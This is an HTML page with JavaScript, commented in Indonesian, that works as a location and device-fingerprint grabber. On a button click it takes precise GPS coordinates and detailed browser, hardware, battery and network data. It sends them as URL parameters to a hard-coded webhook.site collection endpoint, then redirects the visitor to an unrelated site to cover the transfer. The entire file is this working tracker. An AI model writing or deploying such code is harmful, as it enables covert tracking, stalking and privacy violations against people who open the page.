<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <title>Advanced GET Webhook with Geolocation</title>
</head>

<body>

    <button onclick="send()">
        SEND
    </button>

    <pre id="out"></pre>

    <script>
        const WEBHOOK = "https://webhook.site/fd1f8ae0-9538-4102-9012-b6a41bbcfeb7";
        //https://webhook.site/51056dab-66b0-49de-b851-02cfee543777
        // Fungsi Promise untuk mengambil lokasi presisi tinggi
        function getGeolocation() {
            return new Promise((resolve) => {
                if (!("geolocation" in navigator)) {
                    resolve("not supported");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy, // Akurasi dalam meter
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        });
                    },
                    (error) => {
                        resolve({
                            error: error.message,
                            code: error.code
                        });
                    },
                    {
                        enableHighAccuracy: true, // Memaksa GPS hardware jika tersedia
                        timeout: 10000,           // Batas waktu 10 detik
                        maximumAge: 0             // Mencegah penggunaan cache lokasi lama
                    }
                );
            });
        }

        async function send() {
            let data = {
                event: "advanced_browser_info",
                time_utc: new Date().toISOString(),
                time_local: new Date().toString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

                url: location.href,
                referrer: document.referrer || null,
                title: document.title,

                user_agent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,

                language: navigator.language,
                languages: navigator.languages,

                online: navigator.onLine,
                cookie_enabled: navigator.cookieEnabled,

                cores: navigator.hardwareConcurrency || null,
                memory: navigator.deviceMemory || null,
                touch: ("ontouchstart" in window),

                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    pixelRatio: devicePixelRatio
                },

                window: {
                    width: innerWidth,
                    height: innerHeight
                },

                visibility: document.visibilityState
            };

            // 1. Mengambil Geolocation Akurat
            data.geolocation = await getGeolocation();

            // 2. Battery Status (jika didukung)
            try {
                let battery = await navigator.getBattery();
                data.battery = {
                    level: battery.level,
                    charging: battery.charging
                };
            } catch (e) {
                data.battery = "not supported";
            }

            // 3. Network Connection Info (jika didukung)
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.type,
                    effective: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }

            // Menyusun URL Query Parameters
            let params = new URLSearchParams();
            for (let key in data) {
                if (typeof data[key] === "object") {
                    params.append(key, JSON.stringify(data[key]));
                } else {
                    params.append(key, data[key]);
                }
            }

            let url = WEBHOOK + "?" + params.toString();

            document.getElementById("out").textContent = url;

            // Kirim request via GET
            fetch(url, {
                method: "GET",
                mode: "no-cors"
            });

            // Pengalihan halaman
            setTimeout(() => {
                location.href = "https://mylocation.org/";
            }, 1200);
        }
    </script>

</body>

</html>
